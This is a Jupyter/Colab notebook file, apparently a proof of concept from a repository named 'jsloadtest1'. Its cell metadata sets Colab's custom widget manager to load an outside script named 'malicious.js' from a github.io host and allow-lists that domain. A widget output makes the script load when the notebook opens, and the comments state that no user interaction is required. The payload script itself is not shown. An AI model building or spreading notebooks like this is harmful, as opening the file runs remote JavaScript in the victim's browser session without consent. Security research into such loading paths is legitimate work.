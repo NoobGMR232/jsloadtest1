{
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "custom_widget_manager": {
            "url": "https://noobgmr232.github.io/jsloadtest1/malicious.js"

          }
        },
        "experiments": {
          "allowed_public_url_domains": ["noobgmr232.github.io"]

        }
      },
      "outputs": [
        {
          "data": {
            "application/vnd.jupyter.widget-view+json": {
              "model_id": "arbitrary-id",
              "version_major": 2,
              "version_minor": 0
            }
          },
          "metadata": {},
          "output_type": "display_data"
        }
      ],
      "source": [
        "# This cell triggers the loading of the malicious widget.\n",
        "# No user interaction is required."
      ]
    }
  ],
  "metadata": {
    "colab": {
      "name": "Malicious Notebook",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 5
}
